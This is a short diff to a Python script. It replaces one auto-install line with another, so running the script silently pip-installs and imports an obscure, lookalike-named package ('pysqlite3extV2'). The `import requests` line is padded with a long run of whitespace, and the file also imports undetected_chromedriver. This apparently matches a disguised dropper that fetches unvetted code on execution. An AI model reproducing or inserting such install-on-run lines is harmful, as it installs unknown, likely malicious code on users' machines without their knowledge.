@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycolouringsextV1")
-import pycolouringsextV1
+os.system("pip install pysqlite3extV2")
+import pysqlite3extV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
